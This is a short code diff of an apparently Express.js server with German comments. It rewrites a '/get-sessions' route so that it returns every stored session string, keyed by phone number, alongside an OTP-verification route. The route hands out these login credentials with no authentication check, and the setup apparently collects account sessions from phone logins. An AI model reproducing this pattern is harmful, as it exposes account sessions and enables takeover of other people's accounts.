@@ -57,19 +57,11 @@ app.post('/verify-otp', async (req, res) => {
 
 app.get('/get-sessions', async (req, res) => {
     try {
-        // Aggregation: Gruppiert nach Telefonnummer, nimmt den ersten Session-String
-        const sessions = await Session.aggregate([
-            {
-                $group: {
-                    _id: "$phoneNumber",
-                    sessionString: { $first: "$sessionString" },
-                    createdAt: { $first: "$createdAt" }
-                }
-            },
-            { $sort: { createdAt: -1 } }
-        ]);
+        // Einfacher Abruf aller Dokumente
+        const sessions = await Session.find({});
         res.json(sessions);
     } catch (err) {
+        console.error("Datenbank-Fehler:", err);
         res.status(500).send("Fehler beim Laden");
     }
 });
